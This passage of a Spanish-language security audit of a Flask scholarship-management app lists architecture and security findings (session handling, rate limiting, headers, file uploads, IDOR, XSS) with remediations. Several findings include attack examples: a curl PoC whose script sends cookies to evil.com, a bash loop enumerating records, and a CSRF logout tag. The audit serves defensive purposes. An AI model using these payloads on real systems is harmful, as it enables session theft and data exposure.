```

Si el use case `EliminarBecarioUseCase` internamente hace commit parcial (e.g., confirma DB local pero falla al borrar storage de Supabase), el rollback externo no revierte el commit interno. **El patrón saga se rompe**: becario eliminado de la DB pero sus documentos siguen en Supabase Storage.

**Problema 4 — Oculta bugs de dominio:**

Si un use case tiene un bug que modifica una entidad sin querer (e.g., asigna None a un campo, cambia un timestamp), el auto-commit lo persiste. El bug se vuelve silencioso.

**Impacto:**

- **Pérdida de atomicidad** en operaciones multi-step.
- **Datos huérfanos** (storage sin metadata en DB, o viceversa).
- **Auditoría imposible** — no se puede distinguir qué cambio fue intencional vs accidental.

**Remediación:**

```python
# app.py — Unit of Work explícito, sin auto-commit
@app.teardown_appcontext
def _close_db_session(exception=None) -> None:
    db_session = g.pop("db_session", None)
    if db_session is not None:
        try:
            if exception is not None:
                db_session.rollback()
            # NO commit automático — los use cases deben commitear explícitamente
        finally:
            db_session.close()

# O mejor: implementar Unit of Work pattern
class SQLAlchemyUnitOfWork:
    def __init__(self, session_factory):
        self._session_factory = session_factory
    
    def __enter__(self):
        self.session = self._session_factory()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if exc_type is not None:
            self.session.rollback()
        self.session.close()
        # NO commit aquí — el use case decide cuándo commitear

# Uso en un use case:
class EliminarBecarioUseCase:
    def execute(self, ...):
        with self.uow:
            becario = self.uow.becarios.get(becario_id)
            self.storage.delete_files(becario.documentos)
            self.uow.becarios.delete(becario)
            self.uow.commit()  # commit explícito al final de la unidad atómica
```


---

### CRIT-06 · Filtración de entidad de dominio a la capa web

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🔴 Crítico (arquitectura DDD) |
| **CWE** | — |
| **OWASP** | A04:2021 (relacionado — exposición de estructura interna) |
| **Ubicación** | `auth_utils.py:29`, todos los controllers que usan `g.usuario_actual` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth_utils.py:29
if g.usuario_actual.rol.lower() not in roles_permitidos:
    abort(403, ...)

# tutor.py:44, 68, 92
user_id = g.usuario_actual.id_usuario

# becario.py:49, 72, 101, 156
user_id = g.usuario_actual.id_usuario

# admin.py:90, 129, 166, 190, 211, 235, 261, 273-275, 310, 333, 364
resultado_uc = use_case.execute(actor_admin=g.usuario_actual, ...)
```

**Descripción:**

La capa web accede directamente a propiedades de la entidad de dominio `Usuario` (`.rol`, `.id_usuario`) y pasa la entidad completa como parámetro `actor_admin` a los use cases. Esto viola el principio de **Anti-Corruption Layer (ACL)** de DDD: la capa web debería comunicarse con la capa de aplicación mediante **DTOs o primitivos**, no mediante entidades de dominio.

**Problemas concretos:**

1. **Acoplamiento web ↔ dominio**: Cualquier cambio en la entidad `Usuario` (renombrar `id_usuario` a `id`, agregar un campo sensible como `password_hash`) impacta directamente la capa web.

2. **Exposición de campos internos**: Si la entidad `Usuario` tiene campos como `password_hash`, `token_actual`, `fecha_baja`, `notas_internas`, la capa web podría accidentalmente renderizarlos en templates (e.g., `{{ usuario }}` hace dump de todos los atributos en Jinja2).

3. **Bypass de invariantes de dominio**: La entidad puede tener invariantes (e.g., "si `estado = inactivo`, no se puede acceder"). Si la capa web accede a `g.usuario_actual.rol` sin chequear `estado`, está ignorando invariantes de dominio.

4. **Dificultad de testing**: Los tests de la capa web necesitan instanciar entidades de dominio completas, no simples DTOs.

5. **Service Locator anti-pattern**: `g.usuario_actual` es un Service Locator (variable global de Flask). Oculta la dependencia de los use cases, dificultando el razonamiento sobre permisos y dependencias.

**Impacto:**

- **Mantenibilidad**: Cambios en dominio rompen web.
- **Seguridad**: Campos sensibles pueden filtrarse a templates.
- **Testabilidad**: Tests acoplados a implementación de dominio.
- **Invariants**: Bypass silencioso de reglas de dominio.

**Remediación:**

```python
# src/web/dto.py — DTOs para la capa web
from dataclasses import dataclass

@dataclass(frozen=True)
class AuthenticatedUserDTO:
    """DTO inmutable que representa al usuario autenticado desde la perspectiva web."""
    id: int
    rol: str
    email: str
    # NO incluir: password_hash, tokens, estado_interno, etc.
    
    @classmethod
    def from_entity(cls, usuario) -> "AuthenticatedUserDTO":
        # Conversión controlada en un solo lugar
        return cls(
            id=usuario.id_usuario,
            rol=usuario.rol,
            email=usuario.email,
        )

# app.py — antes cargaba entidad, ahora carga DTO
@app.before_request
def _open_db_session() -> None:
    g.db_session = SessionLocal()
    g.usuario_actual = None  # tipo: Optional[AuthenticatedUserDTO]
    
    user_id = session.get("user_id")
    if not user_id:
        return
    
    repo = SQLAlchemyUsuarioRepository(g.db_session)
    usuario = repo.obtener_por_id(user_id)
    if usuario and usuario.activo:
        g.usuario_actual = AuthenticatedUserDTO.from_entity(usuario)

# auth_utils.py — usa DTO
def requiere_rol(rol_requerido):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not g.usuario_actual:
                return redirect(url_for("auth.login"))
            
            roles_permitidos = (
                [rol_requerido.lower()] if isinstance(rol_requerido, str)
                else [r.lower() for r in rol_requerido]
            )
            if g.usuario_actual.rol.lower() not in roles_permitidos:
                abort(403)
            return f(*args, **kwargs)
        return decorated
    return decorator

# Use cases — recibir primitivos, no entidades
class ListarBecariosTutorUseCase:
    def execute(self, tutor_id: int, busqueda: str = "") -> list[BecarioDTO]:
        # No recibe `actor_admin` como entidad, solo el ID
        ...
```

---

## 5. Hallazgos Altos de Seguridad

### HIGH-01 · `SESSION_COOKIE_SECURE` no seteado

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **Ubicación** | `src/web/app.py:38-39` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# app.py:38-39
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
# Falta: app.config["SESSION_COOKIE_SECURE"] = True
```

**Descripción:**

La cookie de sesión Flask no tiene el flag `Secure`. Esto significa que el navegador la enviará también sobre **HTTP plano**, permitiendo que un atacante en posición de **MITM** (e.g., en una red WiFi pública, o vía ARP spoofing) intercepte la cookie leyendo el tráfico en claro.

**Impacto:**

- Robo de sesión vía MITM en HTTP.
- Aplicable si el deploy sirve la app over HTTP (sin TLS termination).
- Aplicable si hay mixed content (página HTTPS que carga recursos HTTP).

**Remediación:**

```python
app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"  # o "Strict" para mayor seguridad
app.config["SESSION_COOKIE_PARTITIONED"] = True  # CHIPS — aislamiento por site
```

**Adicionalmente**, forzar HTTPS redirect:

```python
# Usar flask-talisman o middleware manual
@app.before_request
def _force_https():
    if not request.is_secure and app.env != "development":
        return redirect(request.url.replace("http://", "https://"), code=301)
```

---

### HIGH-02 · Session Fixation — no regeneración tras login

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-384: Session Fixation |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `src/web/auth.py:50-54` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:49-54
# Save session data
session.permanent = True
session["access_token"] = result["access_token"]
session["refresh_token"] = result["refresh_token"]
session["rol"] = result["rol"]
session["user_id"] = result["usuario"].id_usuario
```

**Descripción:**

Tras un login exitoso, el código **reutiliza la misma cookie de sesión** que tenía el usuario antes del login. Flask no regenera el session ID automáticamente. Esto permite **session fixation**:

1. Atacante obtiene una cookie de sesión Flask válida (visita la app, recibe `session=xyz`).
2. Atacante envía ese `session=xyz` a la víctima (vía link `https://fonbec.example.com/auth/login?session=xyz` si hay cookie reflection, o vía XSS que setee `document.cookie`).
3. Víctima usa la cookie fijada y se loguea con sus credenciales.
4. La cookie `session=xyz` ahora contiene los datos de la víctima (user_id, rol, tokens).
5. **Atacante usa la misma cookie** y accede como la víctima.

**Impacto:**

- Robo de sesión sin necesidad de robar la cookie post-login.
- Funciona incluso con HTTPS (el atacante nunca ve la cookie, solo la fija).

**Remediación:**

```python
# auth.py — login_post, después de credenciales válidas
from flask import session

# Limpiar la sesión vieja completamente
session.clear()

# Regenerar el session ID (Flask no expone API directa, pero esta técnica funciona)
# Opción 1:Modificar la cookie design
from flask.sessions import SecureCookieSessionInterface
session.modified = True  # fuerza re-firma

# Opción 2 (mejor): usar flask-session con backend server-side, que sí regenera IDs
# pip install flask-session
# Session(app)  # configura SESSION_TYPE = 'redis' o 'filesystem'

# Opción 3 (workaround): invalidar y crear nueva
old_data = dict(session)
session.clear()
session.update({
    "user_id": result["usuario"].id_usuario,
    "rol": result["rol"],
    "access_token": result["access_token"],
    "refresh_token": result["refresh_token"],
    # añadir un nonce aleatorio para forzar nueva cookie
    "_sid": secrets.token_urlsafe(32),
})
session.permanent = True
```

**Recomendación:** Usar `flask-session` con backend Redis/filesystem para manejo server-side de sesiones con IDs opacos.

---

### HIGH-03 · Rate limiting ausente en endpoints de autenticación

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-307: Improper Restriction of Excessive Authentication Attempts |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `auth.py:28` (login), `auth.py:138` (set-password), `auth.py:183` (recuperar-contrasena), `admin.py:345` (invitar) |
| **Estado** | Confirmado |

**Descripción:**

Ninguno de los endpoints sensibles tiene rate limiting. Esto permite:

| Endpoint | Vector |
|----------|--------|
| `POST /auth/login` | **Brute force** de contraseñas. Sin límite de intentos por IP, por usuario, ni por email. |
| `POST /auth/recuperar-contrasena` | **Spam de emails** de recuperación a una víctima. |
| `POST /auth/set-password` | **Brute force** del token de invitación. |
| `POST /admin/invitar` | **Spam de invitaciones** a emails arbitrarios. |
| `POST /admin/becarios/<id>/eliminar` | Brute force del campo `email_confirmacion`. |

**Impacto:**

- Compromiso de cuentas con contraseñas débiles.
- Abuso del servicio de email (costo, reputación).
- DoS a usuarios específicos (mailbombing).

**Remediación:**

```bash
pip install flask-limiter
```

```python
# app.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["1000 per hour"],
    storage_uri="redis://localhost:6379",  # obligatorio para multi-worker
    strategy="fixed-window-elastic-expiry"  # suaviza bursts
)
limiter.init_app(app)

# auth.py
from src.web.app import limiter

@auth_bp.route("/login", methods=["POST"])
@limiter.limit("5 per minute; 20 per hour", methods=["POST"])
def login_post():
    ...

# Limit por email (no por IP) para mitigar distributed brute force
@auth_bp.route("/login", methods=["POST"])
@limiter.limit(
    "5 per minute",
    methods=["POST"],
    key_func=lambda: request.form.get("email", "").lower()
)
def login_post():
    ...

# Recuperación: límite por email
@auth_bp.route("/recuperar-contrasena", methods=["POST"])
@limiter.limit(
    "3 per hour",
    methods=["POST"],
    key_func=lambda: request.form.get("email", "").lower()
)
def recuperar_contrasena():
    ...
```

**Adicional:**

- Implementar **account lockout** suave (5 intentos fallidos → bloqueo 15 min, no permanente para evitar DoS por account lockout).
- Detectar **credential stuffing** patrones (mismo email, múltiples passwords desde múltiples IPs).
- Integrar con **HIBP API** para rechazar contraseñas comprometidas en el set-password.

---

### HIGH-04 · Headers de seguridad ausentes (CSP, HSTS, X-Frame-Options)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-1021 (clickjacking), CWE-319 (no HSTS) |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **Ubicación** | `app.py` (no hay configuración de headers) |
| **Estado** | Confirmado |

**Descripción:**

La app no setea ninguno de los siguientes headers críticos:

| Header | Propósito | Consecuencia si ausente |
|--------|-----------|--------------------------|
| `Content-Security-Policy` | Mitiga XSS, data exfiltration | XSS tiene impacto total |
| `Strict-Transport-Security` | Force TLS | Primera visita over HTTP → MITM |
| `X-Frame-Options` / `frame-ancestors` | Anti-clickjacking | Clickjacking posible |
| `X-Content-Type-Options: nosniff` | Anti-MIME sniffing | Navegador puede ejecutar contenido como script |
| `Referrer-Policy` | Control de leak de URL vía Referer | Tokens en URL se filtran a terceros |
| `Permissions-Policy` | Restringe APIs del navegador (camera, mic, geolocation) | Acceso innecesario a APIs |

**Remediación:**

```bash
pip install flask-talisman
```

```python
# app.py
from flask_talisman import Talisman

def create_app() -> Flask:
    app = Flask(...)
    
    # CSP estricta para SSR con Jinja2
    csp = {
        'default-src': "'self'",
        'script-src': "'self'",  # sin 'unsafe-inline' ni 'unsafe-eval'
        'style-src': "'self' 'unsafe-inline'",  # Jinja2 inline styles
        'img-src': "'self' data: https:",
        'font-src': "'self'",
        'connect-src': "'self'",
        'frame-ancestors': "'none'",  # equivalente a X-Frame-Options: DENY
        'form-action': "'self'",
        'base-uri': "'self'",
        'object-src': "'none'",  # sin Flash/Java
        'upgrade-insecure-requests': True,
    }
    
    Talisman(
        app,
        content_security_policy=csp,
        force_https=True,
        strict_transport_security=True,
        strict_transport_security_max_age=63072000,  # 2 años
        strict_transport_security_preload=True,
        strict_transport_security_include_subdomains=True,
        frame_options='DENY',
        referrer_policy='strict-origin-when-cross-origin',
    )
    ...
```

**Nota sobre CSP y Supabase:** Si usás Supabase Auth con redirecciones o llamadas JS, necesitás permitir el dominio de Supabase en `connect-src` y `form-action`.

---

### HIGH-05 · Logout vía GET (CSRF logout)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-352: Cross-Site Request Forgery |
| **OWASP** | A01:2021 — Broken Access Control |
| **Ubicación** | `src/web/auth.py:76` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:76
@auth_bp.route("/logout", methods=["GET", "POST"])
def logout():
    ...
    session.clear()
    ...
    return redirect(url_for("auth.login"))
```

**Descripción:**

El logout acepta GET. Un atacante puede incluir en cualquier página:

```html
<img src="https://fonbec.example.com/auth/logout" style="display:none" />
```

Y el navegador del usuario autenticado hará un GET a `/auth/logout`, cerrando su sesión sin su consentimiento.

**Vectores derivados:**

- **DoS UX**: Víctima constantemente deslogueada.
- **Phishing post-logout**: Tras desloguear a la víctima, redirigirla a una página de login falsa.
- **Session race**: Si la víctima está llenando un form largo, el logout pierde el trabajo.

**Remediación:**

```python
@auth_bp.route("/logout", methods=["POST"])  # Solo POST
@requiere_rol(None)  # cualquier rol autenticado, pero NO GET
def logout():
    ...
```

```html
<form method="POST" action="/auth/logout">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
  <button type="submit">Cerrar sesión</button>
</form>
```

---

### HIGH-06 · Upload de archivos sin validación (MIME, tamaño, contenido)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **OWASP** | A04:2021 — Insecure Design |
| **Ubicación** | `src/web/routes/becario.py:120-124` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# becario.py:120-124
archivos = []
for tipo in TIPOS_DOCUMENTO:
    file_obj = request.files.get(tipo)
    if file_obj and file_obj.filename:
        archivos.append((tipo, file_obj))
```

**Descripción:**

Los archivos subidos (`Programa`, `CartaCompromiso`, `Inscripcion`) no se validan en la capa web. No se verifica:

1. **Extensión**: Cualquier extensión es aceptada (`.exe`, `.html`, `.svg`, `.php` si el storage sirve PHP).
2. **MIME type**: El `Content-Type` declarado por el cliente no se verifica contra el contenido real (magic bytes).
3. **Tamaño**: Solo `MAX_CONTENT_LENGTH` global limitaría, pero no está seteado (ver HIGH-07).
4. **Contenido**: No se escanea por macros (Office), JavaScript embebido (SVG/HTML), o malware.
5. **Cantidad**: Solo se aceptan 3 archivos (por el loop sobre `TIPOS_DOCUMENTO`), pero el tamaño individual no se limita.
6. **Nombre de archivo**: `file_obj.filename` se pasa al use case sin sanitizar. Si el use case o el storage lo usan como path, hay riesgo de **path traversal** (e.g., `../../etc/passwd`).

**Impacto:**

- **XSS stored**: Si el storage sirve los archivos con el MIME que el cliente declaró, un `.html` subido puede ejecutar JS en el origen del storage. Si el storage comparte origen con la app, es XSS completo.
- **Path traversal**: Si el filename se usa en path construction.
- **DoS**: Subida de archivos enormes.
- **Malware hosting**: La plataforma se convierte en host de malware.

**Vector de ataque:**

1. Becario malintencionado sube un archivo `Programa.html` con `<script>fetch('/admin/becarios', {credentials:'include'})</script>`.
2. Si un admin/tutor abre el archivo en el navegador (mismo origen), el script ejecuta con sus cookies.
3. **XSS stored** → robo de sesión admin.

**Remediación:**

```python
# becario.py — validación estricta
import magic  # python-magic
import os

ALLOWED_MIMES = {
    "Programa": {"application/pdf"},
    "CartaCompromiso": {"application/pdf"},
    "Inscripcion": {"application/pdf"},
}
ALLOWED_EXTENSIONS = {".pdf"}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB

def _validate_upload(file_obj, tipo: str) -> tuple[str, str] | None:
    """Valida y retorna (filename_safe, error_msg)."""
    if not file_obj or not file_obj.filename:
        return None
    
    filename = file_obj.filename
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return (filename, f"Extensión no permitida: {ext}")
    
    # Validar MIME por magic bytes (no confiar en Content-Type del cliente)
    head = file_obj.read(2048)
    file_obj.seek(0)
    detected = magic.from_buffer(head, mime=True)
    if detected not in ALLOWED_MIMES[tipo]:
        return (filename, f"Tipo de archivo no permitido: {detected}")
    
    # Validar tamaño
    file_obj.seek(0, 2)  # seek end
    size = file_obj.tell()
    file_obj.seek(0)
    if size > MAX_FILE_SIZE:
        return (filename, f"Archivo demasiado grande ({size} bytes, máx {MAX_FILE_SIZE})")
    
    return None  # OK

# En el route:
archivos = []
for tipo in TIPOS_DOCUMENTO:
    file_obj = request.files.get(tipo)
    error = _validate_upload(file_obj, tipo)
    if error:
        flash(f"Error en {tipo}: {error[1]}", "error")
        return redirect(url_for("becario.editar_formulario_academico"))
    if file_obj and file_obj.filename:
        archivos.append((tipo, file_obj))
```

**En el storage (Supabase Storage):**

- Setear `upsert: false` para no sobreescribir.
- Usar **path aleatorio** (UUID) en vez del filename original.
- Setear `Content-Disposition: attachment` para forzar descarga (no ejecución inline).
- Setear `Content-Type: application/pdf` explícitamente (no autodetectar).

---

### HIGH-07 · `MAX_CONTENT_LENGTH` ausente (DoS por memoria)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-400: Uncontrolled Resource Consumption |
| **OWASP** | A04:2021 — Insecure Design |
| **Ubicación** | `app.py` (no configurado) |
| **Estado** | Confirmado |

**Descripción:**

Flask por defecto no limita el tamaño del body de un request. Un atacante puede enviar un POST con un body de varios GB, agotando la memoria del proceso y tirando la app.

Específicamente en este código:

- `request.form.get(...)` parsea el body a memoria.
- `request.files.get(...)` se guarda en un `SpooledTemporaryFile` (default 500KB en memoria, luego disco), pero sin límite total.

**Impacto:**

- DoS por OOM (out of memory).
- DoS por disco lleno (si los uploads van a disco temporal).
- Costo de带宽/cloud egress.

**Remediación:**

```python
# app.py
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16 MB total por request

# Para uploads específicos, validar size en el route (ver HIGH-06)
```

```python
# Manejo del error 413
from werkzeug.exceptions import RequestEntityTooLarge

@app.errorhandler(RequestEntityTooLarge)
def handle_payload_too_large(e):
    flash("El archivo subido excede el tamaño máximo permitido.", "error")
    return redirect(request.referrer or url_for("index")), 413
```

---

### HIGH-08 · IDOR en `/tutor/becario/<id_usuario>`

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto |
| **CWE** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **OWASP** | A01:2021 — Broken Access Control |
| **Ubicación** | `src/web/routes/tutor.py:60-78` |
| **Estado** | Potencial (depende de la implementación del use case) |

**Código vulnerable:**

```python
# tutor.py:60-78
@tutor_bp.route("/becario/<id_usuario>", methods=["GET"])
@requiere_rol("tutor")
def becario_detalle(id_usuario):
    user_id = g.usuario_actual.id_usuario
    repo = SQLAlchemyTutorRepository(g.db_session)
    use_case = ObtenerDatosBecarioUseCase(repo)
    
    try:
        datos = use_case.execute(user_id, id_usuario)  # ← ¿valida asignación?
    except ValueError as e:
        ...
    
    return render_template("shared/becario_detalle.html", datos=datos, id_usuario=id_usuario)
```

**Descripción:**

El `id_usuario` viene de la URL (user-controlled). El use case recibe `(user_id_tutor, id_becario)` y debe validar que el becario esté asignado al tutor. **No podemos verificar** esta validación porque no se auditó el use case.

**Riesgo si el use case NO valida:**

Un tutor puede ver los datos de cualquier becario del sistema, sin importar si está asignado:

```
GET /tutor/becario/1
GET /tutor/becario/2
GET /tutor/becario/3
...
```

Esto expone:
- Datos personales (nombre, apellido, teléfono, dirección, edad, sexo).
- Datos académicos (carrera, materias, documentos PDF).
- Vinculaciones (otros tutores, padrinos, mediadores).

**Vector de ataque (si se confirma):**

```bash
# Script para enumerar todos los becarios
for id in $(seq 1 1000); do
    curl -b "session=<cookie_forjada_o_robada>" \
         "https://fonbec.example.com/tutor/becario/$id" \
         -o "becario_$id.html"
done
```

**Remediación:**

```python
# Opción A — Validación explícita en el use case (recomendado)
class ObtenerDatosBecarioUseCase:
    def execute(self, tutor_id: int, becario_id: int) -> BecarioDTO:
        # Verificar asignación
        if not self.repo.es_becario_asignado_a_tutor(becario_id, tutor_id):
            raise PermissionError(
                f"El becario {becario_id} no está asignado al tutor {tutor_id}"
            )
        return self.repo.obtener_datos_becario(becario_id)

# Opción B — Defense in depth en el controller
@tutor_bp.route("/becario/<id_usuario>", methods=["GET"])
@requiere_rol("tutor")
def becario_detalle(id_usuario):
    user_id = g.usuario_actual.id_usuario
    
    # Validación previa en el controller
    repo = SQLAlchemyTutorRepository(g.db_session)
    if not repo.es_becario_asignado_a_tutor(int(id_usuario), user_id):
        abort(403, description="Becario no asignado")
    
    use_case = ObtenerDatosBecarioUseCase(repo)
    datos = use_case.execute(user_id, id_usuario)
    ...
```

**Recomendación:** Implementar ambos (A y B) para defense in depth.

---

### HIGH-09 · Stored XSS potencial en campos de perfil y flashes

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟠 Alto (potencial) |
| **CWE** | CWE-79: Cross-site Scripting (Stored) |
| **OWASP** | A03:2021 — Injection |
| **Ubicación** | `auth.py:147-154, 294-301`, `admin.py:170, 194, 321, 340`, `becario.py:160` |
| **Estado** | Potencial (depende de los templates) |

**Código vulnerable:**

```python
# auth.py:147-154 (set_password)
datos_usuario = {
    "nombre": request.form.get("nombre", ""),
    "apellido": request.form.get("apellido", ""),
    "telefono": request.form.get("telefono", ""),
    "edad": int(request.form.get("edad", 0)) if request.form.get("edad") else 0,
    "sexo": request.form.get("sexo", ""),
    "direccion": request.form.get("direccion", "")
}
# Estos strings se guardan en la DB y luego se renderizan en perfil.html

# admin.py:170 (nuevo_padrino)
except Exception as e:
    flash(f"Error al crear: {str(e)}", "error")  # str(e) puede incluir input del usuario

# admin.py:321 (vincular_actor)
except Exception as e:
    flash(f"Error inesperado al vincular: {str(e)}", "error")

# becario.py:160 (eliminar_documento)
if tipo_documento not in TIPOS_DOCUMENTO:
    flash(f"Tipo de documento inválido: '{tipo_documento}'.", "error")  # input reflejado
```

**Descripción:**

Varios inputs del usuario se reflejan en mensajes `flash` o se almacenan en la DB para posterior renderizado. **Si los templates Jinja2 no escapan correctamente** (e.g., usan `|safe`, `{% autoescape false %}`, o el template es `.txt`), hay XSS.

**Casos específicos:**

1. **Campos de perfil (`nombre`, `apellido`, `telefono`, `direccion`)**: Se guardan en DB. Si el template `auth/perfil.html` hace `{{ usuario.telefono }}` sin escape (raro en Jinja2, pero posible con `|safe`), el payload `<script>...</script>` ejecuta.

2. **`flash(f"Error al crear: {str(e)}")`**: Si la excepción `e` incluye el input del usuario (e.g., "Email inválido: `<script>alert(1)</script>@evil.com`"), y el template de flash usa `|safe`, XSS reflejado.

3. **`flash(f"Tipo de documento inválido: '{tipo_documento}'.")`**: El `tipo_documento` es input del usuario reflejado. XSS reflejado.

4. **`flash(f"{rol.capitalize()} eliminado correctamente.")`**: `rol` viene de la URL (`/admin/referentes/<rol>/<id>/eliminar`). Si un atacante comparte un link como `/admin/referentes/<script>alert(1)</script>/1/eliminar`, y el template no escapa, XSS.

**Impacto:**

- **Robo de sesión** (cookie HTTPOnly mitiga, pero el script puede hacer fetch con credentials).
- **Escalada a admin** si el XSS está en una página de admin.
- **Defacement** de la vista del usuario.

**Vector de ataque (PoC):**

```bash
# Setear teléfono con payload XSS
curl -X POST https://fonbec.example.com/auth/perfil \
     -b "session=<cookie>" \
     -d "telefono=<script>fetch('https://evil.com/?c='+document.cookie)</script>" \
     -d "direccion=Cualquier cosa"
# Si el admin ve el perfil de este usuario (e.g., en /admin/directorio/becario),
# el script ejecuta con la sesión del admin.
```

**Remediación:**

1. **En templates**: Asegurar que **ningún** output use `|safe` sin sanitizar previamente. Auditar todos los `.html` con:

```bash
grep -rn "|safe" src/templates/
grep -rn "autoescape false" src/templates/
```

2. **En controllers**: Sanitizar inputs antes de guardarlos (aunque la DB y los templates deberían escapar, defense in depth):

```python
import bleach

def sanitize_text(value: str, max_length: int = 200) -> str:
    if not value:
        return ""
    return bleach.clean(value.strip(), tags=[], strip=True)[:max_length]

datos_usuario = {
    "nombre": sanitize_text(request.form.get("nombre", "")),
    "apellido": sanitize_text(request.form.get("apellido", "")),
    ...
}
```

3. **En flashes**: Nunca reflejar input del usuario en mensajes de error. Usar mensajes genéricos:

```python
# Mal:
flash(f"Tipo de documento inválido: '{tipo_documento}'.", "error")

# Bien:
flash("Tipo de documento inválido.", "error")
# Log interno con detalle:
logging.warning(f"Tipo de documento inválido: {tipo_documento!r}")
```

4. **CSP** (ver HIGH-04): Mitiga el impacto de cualquier XSS residual.


---

## 6. Hallazgos Medios y Bajos de Seguridad

### MED-01 · Tokens Supabase almacenados en sesión Flask

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-522: Insufficiently Protected Credentials |
| **OWASP** | A04:2021 — Insecure Design |
| **Ubicación** | `auth.py:51-54, 114-115, 132-133, 222-224, 243-244` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
session["access_token"] = result["access_token"]
session["refresh_token"] = result["refresh_token"]
session["temp_access_token"] = res["access_token"]
session["temp_refresh_token"] = res["refresh_token"]
```

**Descripción:**

Los JWT de Supabase (`access_token`, `refresh_token`) se almacenan en la cookie de sesión Flask. La cookie está firmada (HMAC) pero **no encriptada** — cualquier persona con el valor de la cookie puede decodificarla (base64) y leer los tokens.

**Riesgos:**

1. Si el `SECRET_KEY` se compromete (ver CRIT-01), los tokens son legibles.
2. Los tokens persisten en el navegador del usuario (cookie) hasta la expiración de la sesión.
3. Los `temp_*` tokens (para set-password / nueva-contrasena) coexisten con los tokens de sesión regular, lo que puede causar confusión de estado.
4. Si el usuario comparte la URL con `?session=...` (a veces los navegadores lo permiten en redirects), el token se filtra.

**Remediación:**

- **No almacenar tokens en la cookie**. En su lugar:
  - Opción A: Usar `flask-session` con backend server-side (Redis) y guardar los tokens ahí, referenciados por un session ID opaco.
  - Opción B: Mover los tokens a una tabla `sesiones` en la DB, con FK al `user_id` y un `session_id` opaco en la cookie.
- Implementar **token rotation**: el `access_token` se renueva vía `refresh_token` periódicamente, y el `refresh_token` rota en cada uso.
- Borrar los `temp_*` tokens inmediatamente después de usarlos (ya se hace, pero verificar).

---

### MED-02 · `access_token` aceptado desde POST form

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-601: URL Redirection to Untrusted Site |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ubicación** | `auth.py:125, 141, 234` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:125-126 (callback POST)
access_token = request.form.get("access_token")
refresh_token = request.form.get("refresh_token")

# auth.py:141 (set-password)
access_token = request.form.get("access_token") or session.get("temp_access_token")

# auth.py:234 (nueva-contrasena)
access_token = request.form.get("access_token") or session.get("temp_access_token")
```

**Descripción:**

El `access_token` puede ser enviado vía POST form, lo que implica que el template lo renderiza como `<input type="hidden" name="access_token" value="...">` (ver MED-06). Esto permite que un atacante **sobreescriba el token** enviando su propio token en el form:

1. Atacante inicia flujo de invitación con su propio email, obtiene `access_token_A`.
2. Atacante convence a la víctima de visitar una página con un form que POST a `/auth/set-password` con `access_token=access_token_A` y datos de perfil.
3. La víctima, con sesión Flask activa (su `temp_access_token`), es ignorada — el POST del form pisa con `access_token_A`.
4. Resultado: se completa el registro del atacante en la sesión de la víctima, o se mezclan datos.

**Remediación:**

- Solo aceptar el token desde la sesión Flask, nunca del form:

```python
access_token = session.get("temp_access_token")
if not access_token:
    flash("Token de sesión faltante.", "error")
    return redirect(url_for("index"))
```

- Si es estrictamente necesario pasarlo por form (e.g., por limitaciones de Jinja2 sin sesión), firmar el token con un HMAC server-side y verificar la firma al recibirlo.

---

### MED-03 · Information disclosure en flashes (`str(e)`)

| Atributo | Valor |
|----------|-------|
| **Severidad** | 🟡 Medio |
| **CWE** | CWE-209: Generation of Error Message Containing Sensitive Information |
| **OWASP** | A04:2021 — Insecure Design |
| **Ubicación** | `auth.py:118, 176, 180`, `admin.py:170, 194, 319, 321, 340` |
| **Estado** | Confirmado |

**Código vulnerable:**

```python
# auth.py:118
flash(f"El enlace de invitación expiró o es inválido: {str(e)}", "error")

# admin.py:170
flash(f"Error al crear: {str(e)}", "error")

# admin.py:321
flash(f"Error inesperado al vincular: {str(e)}", "error")
```

**Descripción:**

Los mensajes `flash` reflejan `str(e)` directamente al usuario. Las excepciones pueden contener:

- Mensajes de error de la DB (e.g., `sqlalchemy.exc.IntegrityError: duplicate key value violates unique constraint "usuarios_email_key" DETAIL: Key (email)=(foo@bar.com) already exists.`).
